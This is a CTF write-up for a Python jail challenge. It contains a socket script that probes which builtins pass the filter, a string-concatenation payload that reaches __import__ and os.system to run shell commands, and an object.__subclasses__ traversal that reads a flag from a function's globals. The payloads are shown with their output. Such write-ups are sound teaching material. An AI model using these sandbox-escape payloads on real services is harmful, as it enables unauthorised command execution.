# Write-Up – Small Jail Portal (Python Jail)

**Challenge :** Small Jail Portal  
**Points :** 315  
**Auteur :** NomanProdhan  

---

## Description :

Welcome to the Portal of Jail.

**Connection Info :**  
`nc 96.126.114.185 9969`

## Exploration

```bash
nc 96.126.114.185 9969       

=== Small Jail Portal===
portal is very user‑friendly, but it has a secret.
But portal is very picky to choose friends.
=========================================

>>> a
Error: NameError
>>> 
Error: NameError
```

After a few tries we manage to get a different error:
```bash
>>> os
Error: ValueError
>>> int
<class 'int'>
```
And we might notice those are python words, until we get a `<class 'int'>` which confirms we are currently in a Python Jail.

However, most commands are blocked:
```bash
>>> import
Error: ValueError
>>> import os
Error: ValueError
```

We might want to investigate, I downloaded a list of common functions in Python and the list of all Python Keywords and ran a try-error .py script working with websockets.
```python
import socket

def main():
    host = "96.126.114.185"
    port = 9969

    base_commands = [
        'abs', 'aiter', 'all', 'anext', 'any', 'ascii',
        'bin', 'bool', 'breakpoint', 'bytearray', 'bytes',
        'callable', 'chr', 'classmethod', 'compile', 'complex',
        'delattr', 'dict', 'dir', 'divmod',
        'enumerate', 'eval', 'exec',
        'filter', 'float', 'format', 'frozenset',
        'getattr', 'globals',
        'hasattr', 'hash', 'help', 'hex',
        'id', 'input', 'int', 'isinstance', 'issubclass', 'iter',
        'len', 'list', 'locals',
        'map', 'max', 'memoryview', 'min',
        'next',
        'object', 'oct', 'open', 'ord',
        'pow', 'print', 'property',
        'range', 'repr', 'reversed', 'round',
        'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super',
        'tuple', 'type',
        'vars',
        'zip',
        '__import__',
    ]

    base_keywords = [
        'False', 'None', 'True', 'and', 'as', 'assert', 'async', 'await', 'break',
        'class', 'continue', 'def', 'del', 'elif', 'else', 'except', 'finally',
        'for', 'from', 'global', 'if', 'import', 'in', 'is', 'lambda', 'nonlocal',
        'not', 'or', 'pass', 'raise', 'return', 'try', 'while', 'with', 'yield'
    ]

    commands = []
    for cmd in base_commands:
        commands.append(cmd)
        commands.append(cmd + '()')
    for cmd in base_keywords:
        commands.append(cmd)

    successful_commands = []

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.recv(4096)  # Welcome or banner

        for command in commands:
            try:
                s.sendall(command.encode() + b"\n")
                response = s.recv(4096).decode()

                if "NameError" not in response and "ValueError" not in response:
                    successful_commands.append((command, response.strip()))
            except Exception as e:
                print(f"Error while sending command {command}: {e}")

    print("\n--- Successful Commands (No NameError or ValueError) ---")
    for cmd, resp in successful_commands:
        print(f"{cmd} => {resp}")

if __name__ == "__main__":
    main()
```

Here are the only commands that did not let to NameError or ValueError:
```bash
--- Successful Commands (No NameError or ValueError) ---
abs => <built-in function abs>
all => <built-in function all>
any => <built-in function any>
bool => <class 'bool'>
bool() => False
chr => <built-in function chr>
float => <class 'float'>
float() => 0.0
getattr => <built-in function getattr>
hash => <built-in function hash>
hex => <built-in function hex>
int => <class 'int'>
int() => 0
isinstance => <built-in function isinstance>
len => <built-in function len>
list => <class 'list'>
list() => []
max => <built-in function max>
min => <built-in function min>
ord => <built-in function ord>
pow => <built-in function pow>
print => <built-in function print>
range => <class 'range'>
repr => <built-in function repr>
round => <built-in function round>
set => <class 'set'>
set() => set()
slice => <class 'slice'>
sorted => <built-in function sorted>
str => <class 'str'>
str() => 
sum => <built-in function sum>
tuple => <class 'tuple'>
tuple() => ()
False => False
True => True
```

From now on we know that we can do operations, and we have the `getattr` function that might be interesting.

## Payload 1

I found out that creating a string by concatenation bypassed the protection. After a few tries I had:
```python
>>> getattr(print, "_"*2 + "self" + "_"*2)
<module 'builtins' (built-in)>

>>> getattr(print, "_"*2 + "imp" + "ort" + "_"*2)
Error: AttributeError
```
etc.

We'll then use the := syntax:
### 🧠 What does := do?

It assigns a value to a variable at the same time as it's used in an expression.

It's a cross between :
- an assignment (=), and
- inline use in an expression.

🔍 Simple example:
```bash
if (n := len([1, 2, 3])) > 2:
    print(f"Liste de longueur {n}")
```

After string concatenation:
```bash
>>> [b:=getattr(print,"_"*2+"sel"+"f"+"_"*2),i:=getattr(b,"_"*2+"imp"+"ort"+"_"*2),o:=i("o"+"s"),s:=getattr(o,"sy"+"stem"),s("ls -a")]
.
..
.bash_logout
.bashprofile
.bashrc
pyJail.py
ynetd
[<module 'builtins' (built-in)>, <built-in function import>, <module 'os' (frozen)>, <built-in function system>, 0]


>>> [b:=getattr(print,""2+"sel"+"f"+"_"2),i:=getattr(b,""*2+"imp"+"ort"+""*2),o:=i("o"+"s"),s:=getattr(o,"sy"+"stem"),s("cat pyJail.py")]
#!/usr/bin/env python3
import builtins, signal, resource

FLAG = "BDSEC{w3lCom3_TO_PyJail}"
```

## Payload 2
```python
>>> getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()
[..., <class '__main__.Access'>, ...] 
```

### 🧠 What is <class ‘object’>?

It's the universal base class from which all classes inherit, barring very specific exceptions.

In other words:
```python
class MyClass:
    pass

print(issubclass(MyClass, object))  # True

class MyClass: pass
# is equivalent to
class MyClass(object): pass
```

Using getattr, you can go back to `object`, going up the aborescence of classes to get out of the context of the current class:
```python
>>> getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0]
<class 'object'>
```
And you can use `object.__subclasses__()` to display all classes:
```python
>>> getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()
[<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class '_contextvars.Token'>, ...]

>>> getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()[219]
<class '__main__.Access'>
```
Once we have access to the class we're interested in, we'll explore it:

### 🧠 What is CLASS.__dict__?

For a `CLASS` class, `CLASS.__dict__` is a Python dictionary containing the attributes and methods defined directly in that class (not inherited ones).

It can be accessed as follows:
```python
>>> getattr(getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()[219], "_""_dict_""_")
mappingproxy({'__module__': '__main__', '__firstlineno__': 21, '__slots__': (), 'reveal': <function Access.reveal at 0x7e658ecbb880>, '__static_attributes__': (), '__doc__': None})
```

You can then access any function defined in this class, and explore the constants defined in it...
```python
>>> getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()[219].reveal
<function Access.reveal at 0x107b49d00>

>>> getattr(getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()[219].reveal, "_""_dir_""_")()
[..., '__code__', ...]

>>> getattr(getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()[219].reveal, "_""_code_""_")
<code object reveal at 0x7e658edf4c60, file "/home/noman/./pyJail.py", line 23>
```

### 🧠 What are co_consts, co_names and co_code in a Python code object?

- `co_code` : the bytecode (instructions in bytes) that Python executes.
- `co_consts` : a tuple of constants used in the code (numbers, strings, nested functions).
- `co_names` : a tuple of names (variables, functions, attributes) referenced by the bytecode.

```python
>>> getattr(getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()[219].reveal, "_""_code_""_").co_consts
(None, 'Nope.')

>>> getattr(getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()[219].reveal, "_""_code_""_").co_names
('FLAG',)

>>> getattr(getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()[219].reveal, "_""_code_""_").co_code
b'\x95\x00U\x01[\x00\x00\x00\x00\x00\x00\x00\x00\x00:X\x00\x00a\x02\x00\x00U\x01$\x00S\x01$\x00'

>>> getattr(getattr(getattr(getattr((), "_""_class_""_"), "_""_bases_""_")[0], "_""_subclasses_""_")()[219].reveal, "_""_glo""bals_""_")
{ ..., 'FLAG': 'BDSEC{w3lCom3_TO_PyJail}', ...}
```




